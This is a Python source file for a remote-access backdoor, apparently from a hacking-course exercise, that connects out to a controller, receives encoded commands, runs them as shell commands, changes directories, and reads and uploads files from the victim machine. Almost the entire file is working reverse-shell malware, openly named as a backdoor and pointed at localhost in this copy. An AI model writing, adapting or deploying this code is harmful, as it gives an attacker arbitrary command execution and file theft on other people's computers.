import socket, json, base64
import subprocess, os


class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))

    def reliable_send(self,data):
        jason_data = json.dumps(data)
        self.connection.send(base64.b64encode(jason_data))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(base64.b64decode(json_data))
            except ValueError:
                continue

    def execute_system_command(self,command):
        result = subprocess.check_output(" ".join(command), shell=True)
        return result

    def change_working_directory_to(self, path):
        os.chdir(path)

    def read_file(self, path):
        with open(path, "rb") as file:
            print("reading "+path)
            return file.read()

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(content)

    def run(self):
        while True:
            command = self.reliable_receive()
            print("Command received: "+str(command))
            if command[0] == "exit":
                break
            elif command[0] == "cd" and len(command) == 2:
                self.change_working_directory_to(command[1])
                command_result = "Changed directory to "+os.getcwd()
            elif command[0] == "download":
                #command_result="file content "+command[1]
                command_result=self.read_file(command[1])
            else:
                command_result = self.execute_system_command(command)
            self.reliable_send(command_result)
        print("Exit")
        self.connection.close()
        exit()


my_backdoor =Backdoor("localhost",1234)
my_backdoor.run()